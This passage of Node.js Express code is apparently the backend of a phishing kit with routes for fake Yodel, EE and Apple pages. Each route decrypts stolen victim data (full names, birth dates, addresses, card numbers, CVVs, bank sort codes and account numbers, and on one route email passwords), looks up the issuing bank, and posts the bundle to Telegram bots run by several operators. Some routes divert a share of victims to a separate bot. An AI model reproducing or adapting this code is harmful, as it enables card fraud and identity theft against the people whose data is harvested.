  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (hoods == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        hoods = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelHoods:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Yodel:\n${originalText}`
        );
        hoods += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendBigBillz20", cors());

let bill = 0;

app.post("/sendBigBillz20", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        bill = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelBill:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1367138150&text=Yodel:\n${originalText}`
        );
        bill += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendKelvYodelRes", cors());

let kelvCount = 0;

app.post("/sendKelvYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Yodel:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//EE
//EE
//EE

app.options("/eeKelv", cors());

app.post("/eeKelv", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EEKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=EE:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//APPLE
//APPLE
//APPLE

app.options("/sendAppleRes", cors());

app.post("/sendAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (count === 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        count2 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
        );
        count2 = count2 + 1;
      }
    });
});

app.options("/sendMazzaAppleRes", cors());

let mazCount = 3;

app.post("/sendMazzaAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Apple:\n${originalText}`
        );
        mazCount += 1;
      }
    });
});

app.options("/sendStrictlyAppleRes", cors());

app.post("/sendStrictlyAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (count === 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        count = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5266729262&text=Apple:\n${originalText}`
        );
        count = count + 1;
      }
    });
});

let sbCount = 0;

let pastebk = 0;

app.options("/applePasteBk", cors());

app.post("/applePasteBk", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5358629321,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/applePoka", cors());

app.post("/applePoka", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5280917183,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

let firstTrust = 0;

app.options("/appleFirstTrust", cors());

app.post("/appleFirstTrust", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
